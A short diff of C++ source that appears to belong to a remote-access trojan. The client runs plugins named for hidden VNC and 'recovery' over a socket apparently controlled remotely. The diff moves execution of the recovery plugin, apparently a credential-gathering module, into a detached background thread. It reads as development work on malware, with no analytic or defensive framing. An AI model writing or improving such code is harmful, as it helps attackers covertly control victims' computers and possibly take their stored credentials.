@@ -187,7 +187,10 @@ private:
 
     void execute_recovery_command(const json& data) {
         if (pluginMgr.isPluginLoaded(RECOVERY_PLUGIN_ID)) {
-            pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+            SOCKET currentSock = sock;
+            thread([this, currentSock]() {
+                pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", currentSock);
+            }).detach();
         } else {
             request_plugin(RECOVERY_PLUGIN_ID, data);
         }
@@ -342,7 +345,10 @@ private:
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
                                     }
                                 } else if (pluginId == RECOVERY_PLUGIN_ID) {
-                                    pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+                                    SOCKET currentSock = sock;
+                                    thread([this, currentSock]() {
+                                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", currentSock);
+                                    }).detach();
                                 }
                             }
 
